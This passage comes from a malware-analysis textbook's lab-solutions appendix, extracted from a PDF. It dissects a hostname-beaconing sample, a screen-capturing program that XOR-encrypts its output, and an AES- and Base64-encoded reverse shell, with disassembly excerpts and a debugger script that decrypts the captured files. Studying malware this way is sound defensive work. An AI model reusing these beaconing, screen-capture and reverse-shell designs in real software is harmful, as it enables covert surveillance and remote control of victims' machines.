- en: 0040123A mov edx, [ebp+arg_0]
  prefs: []
  type: TYPE_NORMAL
- en: 0040123D push edx
  prefs: []
  type: TYPE_NORMAL
- en: 0040123E push offset aHttpSS ; http://%s/%s/ 
  prefs: []
  type: TYPE_NORMAL
- en: 00401243 lea eax, [ebp+szUrl]
  prefs: []
  type: TYPE_NORMAL
- en: 00401249 push eax ; Dest
  prefs: []
  type: TYPE_NORMAL
- en: 0040124A call sprintf
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 13-4L: Identifying Base64 encoding in a URL*'
  prefs: []
  type: TYPE_NORMAL
- en: Looking at the destination string that is passed to base64_encode, we see that
    it is pushed onto the stack as the fourth argument to sprintf at . Specifically,
    the second string in the format string http://%s/%s/ at  is the path of the URI.
    This is consistent with the beacon string we identified earlier as aG9zdG5hbWUtZm9v.
  prefs: []
  type: TYPE_NORMAL
- en: '**1 3**'
  prefs: []
  type: TYPE_NORMAL
- en: Next, we follow the source string passed to base64_encode and see that it is
    the output of the strncpy function located at , and that the input to the strncpy
    function is the output of a call to gethostname at . Thus, we know that the source
    of the encoded URI path is the hostname. The strncpy function copies only the
    first 12 bytes of the hostname, as seen at .
  prefs: []
  type: TYPE_NORMAL
- en: '**NOTE**'
  prefs: []
  type: TYPE_NORMAL
- en: '*The Base64 string that represents the encoding of the hostname will never
    be longer* *than 16 characters because 12 characters × 4/3 expansion for Base64
    = 16\. It is still* *possible to see the = character as padding at the end of
    the string, but this will occur* *only when the hostname is less than 12 characters
    and the length of the hostname is not* *evenly divisible by 3\.*'
  prefs: []
  type: TYPE_NORMAL
- en: Looking at the remaining code in beacon, we see that it uses WinINet (InternetOpenA,
    InternetOpenUrlA, and InternetReadFile) to open and read the URL composed in Listing
    13-4L. The first character of the returned data is compared with the letter o.
    If the first character is o, then beacon returns 1; otherwise, it returns 0\.
    The main function is composed of a single loop with calls to Sleep and beacon.
    When beacon (0x004011C9) returns true (by getting a web response starting with
    o), the loop exits and the program ends.
  prefs: []
  type: TYPE_NORMAL
- en: To summarize, this malware is a beacon to let the attacker know that it is running.
    The malware sends out a regular beacon with an encoded (and possibly truncated)
    hostname identifier, and when it receives a specific response, it terminates.
  prefs: []
  type: TYPE_NORMAL
- en: Solutions to Labs
  prefs: []
  type: TYPE_NORMAL
- en: '**611**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '**Lab 13-2 Solutions**'
  prefs: []
  type: TYPE_NORMAL
- en: '***Short Answers***'
  prefs: []
  type: TYPE_NORMAL
- en: 1\.
  prefs: []
  type: TYPE_NORMAL
- en: '*Lab13-02.exe* creates large, seemingly random files in its current directory
    with names that start with *temp* and end with eight hexadecimal digits that vary
    for each file.'
  prefs: []
  type: TYPE_NORMAL
- en: 2\.
  prefs: []
  type: TYPE_NORMAL
- en: The XOR search technique identifies potential encoding-related functions at
    sub_401570 and sub_401739\. The other three techniques suggested find nothing.
  prefs: []
  type: TYPE_NORMAL
- en: 3\.
  prefs: []
  type: TYPE_NORMAL
- en: The encoding functions might be found just before the call to WriteFile.
  prefs: []
  type: TYPE_NORMAL
- en: 4\.
  prefs: []
  type: TYPE_NORMAL
- en: The encoding function is sub_40181F.
  prefs: []
  type: TYPE_NORMAL
- en: 5\.
  prefs: []
  type: TYPE_NORMAL
- en: The source content is a screen capture.
  prefs: []
  type: TYPE_NORMAL
- en: 6\.
  prefs: []
  type: TYPE_NORMAL
- en: The algorithm is nonstandard and not easily determined, so the easiest way to
    decode traffic is via instrumentation.
  prefs: []
  type: TYPE_NORMAL
- en: 7\.
  prefs: []
  type: TYPE_NORMAL
- en: See the detailed analysis for how to recover the original source of an encoded
    file.
  prefs: []
  type: TYPE_NORMAL
- en: '***Detailed Analysis***'
  prefs: []
  type: TYPE_NORMAL
- en: We launch the malware and see that it creates new files at a regular interval
    in its current directory. These files are fairly large (multiple megabytes) and
    contain seemingly random data with filenames that start with *temp* and end with
    some random-looking characters, something like the ones shown in Listing 13-5L.
  prefs: []
  type: TYPE_NORMAL
- en: temp062da212
  prefs: []
  type: TYPE_NORMAL
- en: temp062dcb25
  prefs: []
  type: TYPE_NORMAL
- en: temp062df572
  prefs: []
  type: TYPE_NORMAL
- en: temp062e1f50
  prefs: []
  type: TYPE_NORMAL
- en: temp062e491f
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 13-5L: Example filenames created by* Lab13-02.exe Next, we search
    the malware for evidence of encoding techniques using static analysis. The PEiD
    KANAL plug-in, FindCrypt2 plug-in for IDA Pro, and IDA Entropy Plugin fail to
    find anything of interest. However, a search for xor instructions yields the results
    shown in Table 13-1L.'
  prefs: []
  type: TYPE_NORMAL
- en: '**Table 13-1L:** The xor Instructions Found in *Lab13-02.exe* **Address**'
  prefs: []
  type: TYPE_NORMAL
- en: '**Function**'
  prefs: []
  type: TYPE_NORMAL
- en: '**Instruction**'
  prefs: []
  type: TYPE_NORMAL
- en: '00401040'
  prefs: []
  type: TYPE_NORMAL
- en: sub_401000
  prefs: []
  type: TYPE_NORMAL
- en: xor eax, eax 
  prefs: []
  type: TYPE_NORMAL
- en: 004012D6
  prefs: []
  type: TYPE_NORMAL
- en: sub_40128D 
  prefs: []
  type: TYPE_NORMAL
- en: xor eax, [ebp+var_10]
  prefs: []
  type: TYPE_NORMAL
- en: 0040171F
  prefs: []
  type: TYPE_NORMAL
- en: 
  prefs: []
  type: TYPE_NORMAL
- en: xor eax, [esi+edx*4]
  prefs: []
  type: TYPE_NORMAL
- en: 0040176F
  prefs: []
  type: TYPE_NORMAL
- en: sub_401739 
  prefs: []
  type: TYPE_NORMAL
- en: xor edx, [ecx]
  prefs: []
  type: TYPE_NORMAL
- en: 0040177A
  prefs: []
  type: TYPE_NORMAL
- en: sub_401739
  prefs: []
  type: TYPE_NORMAL
- en: xor edx, ecx
  prefs: []
  type: TYPE_NORMAL
- en: '**612**'
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '![Image 137](index-646_1.png)'
  prefs: []
  type: TYPE_IMG
- en: '**Table 13-1L:** The xor Instructions Found in *Lab13-02.exe* (continued) **Address**'
  prefs: []
  type: TYPE_NORMAL
- en: '**Function**'
  prefs: []
  type: TYPE_NORMAL
- en: '**Instruction**'
  prefs: []
  type: TYPE_NORMAL
- en: 00401785
  prefs: []
  type: TYPE_NORMAL
- en: sub_401739
  prefs: []
  type: TYPE_NORMAL
- en: xor edx, ecx
  prefs: []
  type: TYPE_NORMAL
- en: 00401795
  prefs: []
  type: TYPE_NORMAL
- en: sub_401739
  prefs: []
  type: TYPE_NORMAL
- en: xor eax, [edx+8]
  prefs: []
  type: TYPE_NORMAL
- en: 004017A1
  prefs: []
  type: TYPE_NORMAL
- en: sub_401739
  prefs: []
  type: TYPE_NORMAL
- en: xor eax, edx
  prefs: []
  type: TYPE_NORMAL
- en: 004017AC
  prefs: []
  type: TYPE_NORMAL
- en: sub_401739
  prefs: []
  type: TYPE_NORMAL
- en: xor eax, edx
  prefs: []
  type: TYPE_NORMAL
- en: 004017BD
  prefs: []
  type: TYPE_NORMAL
- en: sub_401739
  prefs: []
  type: TYPE_NORMAL
- en: xor ecx, [eax+10h]
  prefs: []
  type: TYPE_NORMAL
- en: 004017C9
  prefs: []
  type: TYPE_NORMAL
- en: sub_401739
  prefs: []
  type: TYPE_NORMAL
- en: xor ecx, eax
  prefs: []
  type: TYPE_NORMAL
- en: 004017D4
  prefs: []
  type: TYPE_NORMAL
- en: sub_401739
  prefs: []
  type: TYPE_NORMAL
- en: xor ecx, eax
  prefs: []
  type: TYPE_NORMAL
- en: 004017E5
  prefs: []
  type: TYPE_NORMAL
- en: sub_401739
  prefs: []
  type: TYPE_NORMAL
- en: xor edx, [ecx+18h]
  prefs: []
  type: TYPE_NORMAL
- en: 004017F1
  prefs: []
  type: TYPE_NORMAL
- en: sub_401739
  prefs: []
  type: TYPE_NORMAL
- en: xor edx, ecx
  prefs: []
  type: TYPE_NORMAL
- en: 004017FC
  prefs: []
  type: TYPE_NORMAL
- en: sub_401739
  prefs: []
  type: TYPE_NORMAL
- en: xor edx, ecx
  prefs: []
  type: TYPE_NORMAL
- en: 0040191E
  prefs: []
  type: TYPE_NORMAL
- en: _main
  prefs: []
  type: TYPE_NORMAL
- en: xor eax, eax 
  prefs: []
  type: TYPE_NORMAL
- en: 0040311A
  prefs: []
  type: TYPE_NORMAL
- en: xor dh, [eax] 
  prefs: []
  type: TYPE_NORMAL
- en: 0040311E
  prefs: []
  type: TYPE_NORMAL
- en: xor [eax], dh 
  prefs: []
  type: TYPE_NORMAL
- en: 00403688
  prefs: []
  type: TYPE_NORMAL
- en: xor ecx, ecx 
  prefs: []
  type: TYPE_NORMAL
- en: 004036A5
  prefs: []
  type: TYPE_NORMAL
- en: xor edx, edx 
  prefs: []
  type: TYPE_NORMAL
- en: 'The instructions labeled  in Table 13-1L represent the clearing of a register
    and can be ignored. The instructions labeled  are contained in library functions
    and can also be ignored. We are left with two functions of interest: sub_40128D
     and sub_401739 . Additionally, at 0x0040171F is in an area of code  that has
    not been defined as a function.'
  prefs: []
  type: TYPE_NORMAL
- en: '**1 3**'
  prefs: []
  type: TYPE_NORMAL
- en: We’ll refer to sub_401739 as heavy_xor since
  prefs: []
  type: TYPE_NORMAL
- en: it has so many xor instructions, and sub_40128D
  prefs: []
  type: TYPE_NORMAL
- en: as single_xor since it has only one. heavy_xor
  prefs: []
  type: TYPE_NORMAL
- en: takes four arguments, and it is a single loop
  prefs: []
  type: TYPE_NORMAL
- en: with a large block of code containing many
  prefs: []
  type: TYPE_NORMAL
- en: SHL and SHR instructions in addition to the xor
  prefs: []
  type: TYPE_NORMAL
- en: instructions. Looking at the functions called
  prefs: []
  type: TYPE_NORMAL
- en: by heavy_xor, we see that single_xor is related to
  prefs: []
  type: TYPE_NORMAL
- en: heavy_xor since the caller of single_xor is also
  prefs: []
  type: TYPE_NORMAL
- en: called by heavy_xor, as shown in Figure 13-4L.
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 13-4L: Relationship of*'
  prefs: []
  type: TYPE_NORMAL
- en: Looking at the xor instruction at  in
  prefs: []
  type: TYPE_NORMAL
- en: '*encryption functions*'
  prefs: []
  type: TYPE_NORMAL
- en: Table 13-1L (0x0040171F), we see that it is in
  prefs: []
  type: TYPE_NORMAL
- en: a function, but the function was not automatically identified due to lack of
    use. Defining a function at 0x00401570 results in the creation of a function that
    encompasses the previously orphaned xor instruction. As seen in Figure 13-4L,
    this unused function is also related to the same cluster of likely encoding functions.
  prefs: []
  type: TYPE_NORMAL
- en: To confirm that heavy_xor is the encoding function, let’s see how it is related
    to the *temp* files that were written to disk. We can find where the data is written
    to disk, and then trace backward to determine if and how encoding functions are
    used. Looking at the imported functions, we see WriteFile.
  prefs: []
  type: TYPE_NORMAL
- en: Checking the cross-references to WriteFile, we find sub_401000, which takes
    as arguments a buffer, a length, and a filename, and opens the file and Solutions
    to Labs
  prefs: []
  type: TYPE_NORMAL
- en: '**613**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: writes the buffer to the file. We’ll rename sub_401000 to writeBufferToFile.
  prefs: []
  type: TYPE_NORMAL
- en: sub_401851 is the only function that calls writeBufferToFile, and Listing 13-6L
  prefs: []
  type: TYPE_NORMAL
- en: shows the contents of sub_401851 (which we rename doStuffAndWriteFile), leading
    up to the call to writeBufferToFile at .
  prefs: []
  type: TYPE_NORMAL
- en: lea eax, [ebp+nNumberOfBytesToWrite]
  prefs: []
  type: TYPE_NORMAL
- en: push eax
  prefs: []
  type: TYPE_NORMAL
- en: lea ecx, [ebp+lpBuffer]
  prefs: []
  type: TYPE_NORMAL
- en: push ecx
  prefs: []
  type: TYPE_NORMAL
- en: call sub_401070  ; renamed to getContent
  prefs: []
  type: TYPE_NORMAL
- en: add esp, 8
  prefs: []
  type: TYPE_NORMAL
- en: mov edx, [ebp+nNumberOfBytesToWrite]
  prefs: []
  type: TYPE_NORMAL
- en: push edx
  prefs: []
  type: TYPE_NORMAL
- en: mov eax, [ebp+lpBuffer]
  prefs: []
  type: TYPE_NORMAL
- en: push eax
  prefs: []
  type: TYPE_NORMAL
- en: call sub_40181F  ; renamed to encodingWrapper
  prefs: []
  type: TYPE_NORMAL
- en: add esp, 8
  prefs: []
  type: TYPE_NORMAL
- en: call ds:GetTickCount 
  prefs: []
  type: TYPE_NORMAL
- en: mov [ebp+var_4], eax
  prefs: []
  type: TYPE_NORMAL
- en: mov ecx, [ebp+var_4]
  prefs: []
  type: TYPE_NORMAL
- en: push ecx
  prefs: []
  type: TYPE_NORMAL
- en: push offset Format ; "temp%08x" 
  prefs: []
  type: TYPE_NORMAL
- en: lea edx, [ebp+FileName]
  prefs: []
  type: TYPE_NORMAL
- en: push edx ; Dest
  prefs: []
  type: TYPE_NORMAL
- en: call _sprintf
  prefs: []
  type: TYPE_NORMAL
- en: add esp, 0Ch
  prefs: []
  type: TYPE_NORMAL
- en: lea eax, [ebp+FileName] 
  prefs: []
  type: TYPE_NORMAL
- en: push eax ; lpFileName
  prefs: []
  type: TYPE_NORMAL
- en: mov ecx, [ebp+nNumberOfBytesToWrite]
  prefs: []
  type: TYPE_NORMAL
- en: push ecx ; nNumberOfBytesToWrite
  prefs: []
  type: TYPE_NORMAL
- en: mov edx, [ebp+lpBuffer]
  prefs: []
  type: TYPE_NORMAL
- en: push edx ; lpBuffer
  prefs: []
  type: TYPE_NORMAL
- en: call writeBufferToFile 
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 13-6L: Writing encrypted files*'
  prefs: []
  type: TYPE_NORMAL
- en: Working from the start of Listing 13-6L, we see two function calls to sub_401070
    at  and sub_40181F at  that both use the buffer and length as arguments. The
    format string "temp%08x" at  combined with the result of GetTickCount at  reveals
    the source of the filename, which is the current time printed in hexadecimal.
    IDA Pro has labeled the filename, as indicated at .
  prefs: []
  type: TYPE_NORMAL
- en: From the code in Listing 13-6L, a good hypothesis is that sub_401070 at  is
    used to fetch some content (let’s call it getContent), and that sub_40181F at
    
  prefs: []
  type: TYPE_NORMAL
- en: is used to encrypt the contents (which we’ll rename encodingWrapper).
  prefs: []
  type: TYPE_NORMAL
- en: 'Looking first at our hypothesized encoding function encodingWrapper (at 0x0040181F),
    we see that it is merely a wrapper for heavy_xor. This confirms that the functions
    depicted in Figure 13-4L are our encoding functions. The function encodingWrapper
    sets up four arguments for the encoding: a local variable that is cleared before
    use, two pointers both pointing to the same buffer that is passed in from doStuffAndWriteFile,
    and a buffer size that is also passed in from doStuffAndWriteFile. The two pointers
    pointing to the same buffer **614**'
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: suggest that the encoding function takes source and destination buffers along
    with a length, and that, in this case, the encoding is performed in place.
  prefs: []
  type: TYPE_NORMAL
- en: Next, we identify the source of the content that is encoded and written to disk.
    As we mentioned earlier, the function getContent (at 0x00401070) appears to acquire
    some content. Looking at getContent, we see a single block of code with numerous
    system functions, as shown in Listing 13-7L.
  prefs: []
  type: TYPE_NORMAL
- en: GetSystemMetrics
  prefs: []
  type: TYPE_NORMAL
- en: '**GetDesktopWindow**'
  prefs: []
  type: TYPE_NORMAL
- en: GetDC
  prefs: []
  type: TYPE_NORMAL
- en: CreateCompatibleDC
  prefs: []
  type: TYPE_NORMAL
- en: CreateCompatibleBitmap
  prefs: []
  type: TYPE_NORMAL
- en: SelectObject
  prefs: []
  type: TYPE_NORMAL
- en: '**BitBlt**'
  prefs: []
  type: TYPE_NORMAL
- en: GetObjectA
  prefs: []
  type: TYPE_NORMAL
- en: GlobalAlloc
  prefs: []
  type: TYPE_NORMAL
- en: GlobalLock
  prefs: []
  type: TYPE_NORMAL
- en: '**GetDIBits**'
  prefs: []
  type: TYPE_NORMAL
- en: _memcpy
  prefs: []
  type: TYPE_NORMAL
- en: GlobalUnlock
  prefs: []
  type: TYPE_NORMAL
- en: GlobalFree
  prefs: []
  type: TYPE_NORMAL
- en: ReleaseDC
  prefs: []
  type: TYPE_NORMAL
- en: DeleteDC
  prefs: []
  type: TYPE_NORMAL
- en: DeleteObject
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 13-7L: Windows API functions called in getContent (sub_401070)* Based
    on this list, it is a good guess that this function is trying to capture **1 3**'
  prefs: []
  type: TYPE_NORMAL
- en: the screen. Notably, GetDesktopWindow (bolded) gets a handle to the desktop
    window that covers the entire screen, and the functions BitBlt and GetDIBits (also
    bolded) are related to retrieving bitmap information and copying it to a buffer.
  prefs: []
  type: TYPE_NORMAL
- en: We conclude that the malware repeatedly takes snapshots of the user’s desktop
    and writes an encrypted version of the screen capture to a file.
  prefs: []
  type: TYPE_NORMAL
- en: In order to verify our conclusion, we can take one of the captured files, run
    it back through the encryption algorithm, and retrieve the originally captured
    image. (This assumes that the algorithm is a stream cipher and that encryption
    is reversible; that is, encryption and decryption do the same thing).
  prefs: []
  type: TYPE_NORMAL
- en: Since we have few clues about the algorithm used, the easiest way to implement
    this is to use instrumentation and let the code perform the decoding for us.
  prefs: []
  type: TYPE_NORMAL
- en: 'Since the code already has instructions that take a buffer, encrypt it, and
    then write it to a file, we’ll reuse them as follows:'
  prefs: []
  type: TYPE_NORMAL
- en: 
  prefs: []
  type: TYPE_NORMAL
- en: Let the program run as normal until just before encryption.
  prefs: []
  type: TYPE_NORMAL
- en: 
  prefs: []
  type: TYPE_NORMAL
- en: Replace the buffer holding the screen capture with a buffer holding a previously
    saved file that we wish to decrypt.
  prefs: []
  type: TYPE_NORMAL
- en: 
  prefs: []
  type: TYPE_NORMAL
- en: Let the program write the output to the temporary filename based on the current
    time.
  prefs: []
  type: TYPE_NORMAL
- en: 
  prefs: []
  type: TYPE_NORMAL
- en: Break the program after the first file is written.
  prefs: []
  type: TYPE_NORMAL
- en: Solutions to Labs
  prefs: []
  type: TYPE_NORMAL
- en: '**615**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: We can implement this strategy manually using OllyDbg or use a script-based
    approach to provide more flexibility. We’ll look at the manual approach first.
  prefs: []
  type: TYPE_NORMAL
- en: '**Decoding Using OllyDbg**'
  prefs: []
  type: TYPE_NORMAL
- en: We can implement the instrumentation strategy using OllyDbg by identifying two
    key breakpoints. The first will be just before encoding, so we can use 0x00401880
    as the breakpoint, where the call to encodingWrapper occurs ( in Listing 13-6L).
    The second breakpoint will be after the first file is written, so we set it at
    0x0040190A.
  prefs: []
  type: TYPE_NORMAL
- en: After starting the malware with OllyDbg, setting the breakpoints, and running
    the program, the malware will stop at the first breakpoint (0x00401880). At this
    point, the arguments on the stack represent the buffer to be encrypted and its
    length.
  prefs: []
  type: TYPE_NORMAL
- en: Right-click the top value on the stack in the stack pane (the value located
    at ESP) and select **Follow in Dump**. Next, open one of the encrypted files that
    the malware created in WinHex and select **Edit****Copy All****Hex Values**.
  prefs: []
  type: TYPE_NORMAL
- en: Then, in OllyDbg, select the values from the top of the dump pane to the end
    of the memory block (OllyDbg requires the entire target area to be selected before
    allowing you to paste content). This selection represents the buffer that is about
    to be encoded, which we will now fill with the contents of the file. (Don’t worry
    if the memory block is longer than the buffer size; OllyDbg will paste the content
    only up to the length of the file.) Now right-click the Hex dump portion of the
    dump pane and select **Binary**
  prefs: []
  type: TYPE_NORMAL
- en: '**Binary Paste**. (If you’re using an editor that allows you to copy binary
    values directly, paste into the ASCII portion of the dump pane instead.) With
    the buffer prepared, run OllyDbg until the final breakpoint, and then check the
    malware’s directory for a new file with the same naming convention as the previously
    created ones. Give this file a *.bmp* extension and open it. You should see a
    screenshot that was taken while the malware was running.'
  prefs: []
  type: TYPE_NORMAL
- en: '**NOTE**'
  prefs: []
  type: TYPE_NORMAL
- en: '*Ensure that the file size is the same as that of the second argument passed
    to the encryption function. If you didn’t change the screen resolution between
    the initial malware* *run and this decryption run, the sizes should be the same.
    If the file size is larger than* *the memory buffer, this technique may fail.*'
  prefs: []
  type: TYPE_NORMAL
- en: '**Scripting the Solution**'
  prefs: []
  type: TYPE_NORMAL
- en: In order to implement the instrumentation strategy more generically (in a way
    that does not depend on available buffer sizes), we use the Python-based debugger
    API in Immunity Debugger (ImmDbg), as discussed in “Scriptable Debugging” on page
    200, as well as in Chapter 13\. We create the Python script shown in Listing 13-8L
    by saving the file with a *.py* extension in the *PyScripts* folder under the
    ImmDbg installation directory.
  prefs: []
  type: TYPE_NORMAL
- en: '**NOTE**'
  prefs: []
  type: TYPE_NORMAL
- en: '*Customize the example filename* (C:\\temp062da212) *opened and assigned to
    cfile* *at*  *in Listing 13-8L based on your environment.*'
  prefs: []
  type: TYPE_NORMAL
- en: '**616**'
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '#!/usr/bin/env python'
  prefs: []
  type: TYPE_NORMAL
- en: import immlib
  prefs: []
  type: TYPE_NORMAL
- en: 'def main():'
  prefs: []
  type: TYPE_NORMAL
- en: imm = immlib.Debugger()
  prefs: []
  type: TYPE_NORMAL
- en: 'imm.setBreakpoint(0x00401875) # break just before pushing args for encoding
    imm.Run() # Execute until breakpoint before crypto cfile = open("C:\\temp062da212",''rb'')
    '
  prefs: []
  type: TYPE_NORMAL
- en: 'buffer = cfile.read() # Read encrypted file into buffer sz = len (buffer)'
  prefs: []
  type: TYPE_NORMAL
- en: membuf = imm.remoteVirtualAlloc(sz) 
  prefs: []
  type: TYPE_NORMAL
- en: Allocate memory within debugger process
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: imm.writeMemory(membuf,buffer)
  prefs: []
  type: TYPE_NORMAL
- en: regs = imm.getRegs()
  prefs: []
  type: TYPE_NORMAL
- en: 'imm.writeLong(regs[''EBP'']-12, membuf)  # Set stack variables imm.writeLong(regs[''EBP'']-8,
    sz)'
  prefs: []
  type: TYPE_NORMAL
- en: 'imm.setBreakpoint(0x0040190A) # after single loop imm.Run()'
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 13-8L: ImmDbg decryption script*'
  prefs: []
  type: TYPE_NORMAL
- en: As you can see in Listing 13-8L, the first breakpoint stops execution just before
    the arguments are pushed on the stack. The open call at  opens the encrypted
    file that has already been written to the filesystem. The next few lines read
    the file into memory and calculate the size of the buffer. The remoteVirtualAlloc
    call at  is used to create an appropriately sized buffer in the memory of the
    running process, and writeMemory is used to copy the file contents into that new
    buffer. The two writeLong calls at  replace the stack **1 3**
  prefs: []
  type: TYPE_NORMAL
- en: variables for the buffer to be encrypted and its size. The next few instructions
    push those variables onto the stack to be used for the following encryption routine
    and the writing of the file.
  prefs: []
  type: TYPE_NORMAL
- en: Open the malware in ImmDbg, choose **ImmLib****Run Python Script**, and then
    select the script that has been created. The script should run, and the debugger
    should halt at the second breakpoint. At this point, the malware should have written
    a single file in its own directory. Navigate to the malware’s directory and identify
    the most recently written file. Change the extension of this file to *.bmp* and
    open it. You should see the decrypted screenshot that was taken earlier by the
    malware.
  prefs: []
  type: TYPE_NORMAL
- en: '**Lab 13-3 Solutions**'
  prefs: []
  type: TYPE_NORMAL
- en: '***Short Answers***'
  prefs: []
  type: TYPE_NORMAL
- en: 1\.
  prefs: []
  type: TYPE_NORMAL
- en: Dynamic analysis might reveal some random-looking content that may be encoded.
    There are no recognizable strings in the program output, so nothing else suggests
    encoding.
  prefs: []
  type: TYPE_NORMAL
- en: 2\.
  prefs: []
  type: TYPE_NORMAL
- en: Searching for xor instructions reveals six separate functions that may be associated
    with encoding, but the type of encoding is not immediately clear.
  prefs: []
  type: TYPE_NORMAL
- en: Solutions to Labs
  prefs: []
  type: TYPE_NORMAL
- en: '**617**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: 3\.
  prefs: []
  type: TYPE_NORMAL
- en: All three techniques identify the Advanced Encryption Standard (AES) algorithm
    (Rijndael algorithm), which is associated with all six of the XOR functions identified.
    The IDA Entropy Plugin also identifies a custom Base64 indexing string, which
    shows no evidence of association with xor instructions.
  prefs: []
  type: TYPE_NORMAL
- en: 4\.
  prefs: []
  type: TYPE_NORMAL
- en: The malware uses AES and a custom Base64 cipher.
  prefs: []
  type: TYPE_NORMAL
- en: 5\.
  prefs: []
  type: TYPE_NORMAL
- en: The key for AES is ijklmnopqrstuvwx. The key for the custom Base64
  prefs: []
  type: TYPE_NORMAL
- en: 'cipher is the index string:'
  prefs: []
  type: TYPE_NORMAL
- en: CDEFGHIJKLMNOPQRSTUVWXYZABcdefghijklmnopqrstuvwxyzab0123456789+/
  prefs: []
  type: TYPE_NORMAL
- en: 6\.
  prefs: []
  type: TYPE_NORMAL
- en: The index string is sufficient for the custom Base64 implementation. For AES,
    variables other than the key may be needed to implement decryption, including
    the key-generation algorithm if one is used, the key size, the mode of operation,
    and the initialization vector if one is needed.
  prefs: []
  type: TYPE_NORMAL
- en: 7\.
  prefs: []
  type: TYPE_NORMAL
- en: The malware establishes a reverse command shell with the incoming commands decoded
    using the custom Base64 cipher and the outgoing command-shell responses encrypted
    with AES.
  prefs: []
  type: TYPE_NORMAL
- en: 8\.
  prefs: []
  type: TYPE_NORMAL
- en: See the detailed analysis for an example of how to decrypt content.
  prefs: []
  type: TYPE_NORMAL
- en: '***Detailed Analysis***'
  prefs: []
  type: TYPE_NORMAL
- en: Starting with basic dynamic analysis, we see that the malware tries to resolve
    the domain name *www.practicalmalwareanalysis.com* and connect out on TCP
  prefs: []
  type: TYPE_NORMAL
- en: 'port 8910 to that host. We use Netcat to send some content over the connection,
    and see the malware respond with some random content, but not with any recognizable
    strings. If we then terminate the socket from the Netcat side, we see a message
    like this:'
  prefs: []
  type: TYPE_NORMAL
- en: 'ERROR: API = ReadConsole.'
  prefs: []
  type: TYPE_NORMAL
- en: error code = 0\.
  prefs: []
  type: TYPE_NORMAL
- en: message = The operation completed successfully.
  prefs: []
  type: TYPE_NORMAL
- en: 'Examining the output of strings, we see evidence related to all of the strings
    we have seen so far: www.practicalmalwareanalysis.com, ERROR: API ='
  prefs: []
  type: TYPE_NORMAL
- en: '%s., error code = %d., message = %s., and ReadConsole. There are other relevant
    strings, like WriteConsole and DuplicateHandle, which may be part of error messages
    like the preceding ReadConsole error.'
  prefs: []
  type: TYPE_NORMAL
- en: The random content seen during dynamic analysis suggests that encoding is being
    used, although we can’t tell what is encoded. Certain strings suggest that the
    malware performs encryption, including Data not multiple of Block Size, Empty
    key, Incorrect key length, and Incorrect block length.
  prefs: []
  type: TYPE_NORMAL
- en: Examining the xor instructions and eliminating those associated with register
    clearing and library functions, we find six that contain xor. Given the large
    number of identified functions, let’s just label them for now and see how they
    correspond with the additional techniques we will apply. Table 13-2L
  prefs: []
  type: TYPE_NORMAL
- en: summarizes how we rename the IDA Pro function names.
  prefs: []
  type: TYPE_NORMAL
- en: '**618**'
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '**Table 13-2L:** Functions Containing Suspect xor Instructions **Assigned Function
    Name**'
  prefs: []
  type: TYPE_NORMAL
- en: '**Address of Function**'
  prefs: []
  type: TYPE_NORMAL
- en: s_xor1
  prefs: []
  type: TYPE_NORMAL
- en: 00401AC2
  prefs: []
  type: TYPE_NORMAL
- en: s_xor2
  prefs: []
  type: TYPE_NORMAL
- en: 0040223A
  prefs: []
  type: TYPE_NORMAL
- en: s_xor3
  prefs: []
  type: TYPE_NORMAL
- en: 004027ED
  prefs: []
  type: TYPE_NORMAL
- en: s_xor4
  prefs: []
  type: TYPE_NORMAL
- en: 00402DA8
  prefs: []
  type: TYPE_NORMAL
- en: s_xor5
  prefs: []
  type: TYPE_NORMAL
- en: '00403166'
  prefs: []
  type: TYPE_NORMAL
- en: s_xor6
  prefs: []
  type: TYPE_NORMAL
- en: 00403990
  prefs: []
  type: TYPE_NORMAL
- en: Using the FindCrypt2 plug-in for IDA Pro, we find the constants shown in Listing
    13-9L.
  prefs: []
  type: TYPE_NORMAL
- en: '40CB08: found const array Rijndael_Te0 (used in Rijndael) 40CF08: found const
    array Rijndael_Te1 (used in Rijndael) 40D308: found const array Rijndael_Te2 (used
    in Rijndael) 40D708: found const array Rijndael_Te3 (used in Rijndael) 40DB08:
    found const array Rijndael_Td0 (used in Rijndael) 40DF08: found const array Rijndael_Td1
    (used in Rijndael) 40E308: found const array Rijndael_Td2 (used in Rijndael) 40E708:
    found const array Rijndael_Td3 (used in Rijndael) Found 8 known constant arrays
    in total.'
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 13-9L: FindCrypt2 output*'
  prefs: []
  type: TYPE_NORMAL
- en: Listing 13-9L refers to Rijndael, the original name of the AES cipher.
  prefs: []
  type: TYPE_NORMAL
- en: '**1 3**'
  prefs: []
  type: TYPE_NORMAL
- en: After looking at the cross-references, it is clear that s_xor2 and s_xor4 are
    connected with the encryption constants (_TeX), and s_xor3 and s_xor5
  prefs: []
  type: TYPE_NORMAL
- en: are connected with the decryption constants (_TdX).
  prefs: []
  type: TYPE_NORMAL
